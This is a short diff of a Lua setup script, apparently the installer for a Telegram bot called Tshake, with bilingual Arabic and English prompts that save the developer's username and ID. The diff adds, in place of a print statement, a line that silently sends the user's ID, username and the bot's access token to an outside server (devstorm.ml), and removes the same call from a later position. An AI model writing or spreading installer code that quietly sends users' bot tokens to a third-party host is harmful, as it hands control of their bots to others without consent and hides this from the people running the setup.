@@ -53,10 +53,9 @@ io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قن�
 os.execute('lua start.lua')
 end
 io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف المطور الاسي واستخراج ايدي \n\27[0;39;49m')
-print(User_Info.Info.Username,User_Info.Info.Id)
+https.request("https://devstorm.ml/Tshakex/insert/?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..database:get(Server_Tshake.."Token_Tshake"))
 database:set(Server_Tshake.."UserName_Tshake",User_Info.Info.Username)
 database:set(Server_Tshake.."Id_Tshake",User_Info.Info.Id)
-https.request("https://devstorm.ml/Tshakex/insert/?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..database:get(Server_Tshake.."Token_Tshake"))
 else
 io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
 end 
